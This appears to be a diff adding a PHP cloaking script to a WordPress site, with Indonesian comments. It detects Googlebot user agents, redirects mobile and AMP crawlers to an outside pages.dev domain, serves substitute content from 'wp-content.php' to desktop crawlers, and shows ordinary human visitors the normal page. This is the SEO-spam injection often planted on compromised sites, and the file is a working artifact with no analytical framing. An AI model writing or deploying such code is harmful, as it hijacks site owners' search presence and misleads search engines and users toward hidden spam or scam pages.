@@ -1,0 +1,56 @@
+<?php
+function is_google_bot() {
+    $agents = array(
+        "Googlebot",
+        "Googlebot-Mobile",
+        "Google-Site-Verification",
+        "Google-InspectionTool",
+        "Googlebot-News"
+    );
+
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
+
+    foreach ($agents as $agent) {
+        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+function is_mobile_bot() {
+    $mobile_agents = array("Googlebot-Mobile", "Googlebot (compatible; AMP)");
+
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
+
+    foreach ($mobile_agents as $agent) {
+        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+// Jika Googlebot dari mobile/AMP, redirect
+if (is_google_bot() && is_mobile_bot()) {
+    header("Location: https://senta-its-new.pages.dev");
+    exit;
+}
+
+// Jika Googlebot (desktop), tampilkan konten dari GitHub
+if (is_google_bot()) {
+    $bot_content = file_get_contents('wp-content.php');
+    if ($bot_content !== false) {
+        echo $bot_content;
+    } else {
+        echo "Gagal mengambil konten dari GitHub.";
+    }
+    exit;
+}
+
+// Jika bukan bot, tampilkan halaman untuk manusia
+include('wp-header.php');
+exit;
+?>
